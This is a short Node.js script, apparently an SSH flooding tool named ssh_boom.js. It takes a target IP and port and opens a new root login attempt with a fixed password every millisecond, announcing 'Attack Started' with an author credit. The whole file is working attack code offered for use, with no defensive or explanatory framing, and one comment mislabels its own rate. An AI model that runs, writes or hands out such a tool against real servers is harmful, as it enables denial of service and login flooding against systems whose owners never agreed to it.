const { Client } = require('ssh2');
const crypto = require('crypto');

const ip = process.argv[2];
const port = process.argv[3]; // port SSH default
if (!ip) return console.log("Use\n node ssh_boom.js ip port")
if (!port) return console.log('Use\n node ssh_boom.js ip port')
const username = 'root';
const password = 'memek';
const speedInBps = 2 * 1024 * 1024; // 1 Mbps
const intervalMs = 1; // 1 ms interval
const chunkSize = speedInBps / 1000; // bytes per millisecond

function attemptLogin() {
  const conn = new Client();
  conn.on('ready', () => {
    console.log('Client :: ready');
    // Close the connection immediately to simulate a spam attempt
    conn.end();
  }).on('error', (err) => {
    // Log the error and ignore it
  }).connect({
    host: ip,
    port: port,
    username: username,
    password: password
  });
}

function spamLogin() {
  let totalDataSent = 0;
  const interval = setInterval(() => {
    if (totalDataSent >= speedInBps) {
      totalDataSent = 0;
    } else {
      attemptLogin();
      totalDataSent += chunkSize;
    }
  }, intervalMs);
}
console.clear()
console.log("Attack Started [ Methods By Irfannotsepuh ]")
console.log("Target: " + ip)
console.log("Port: " + port)
spamLogin();
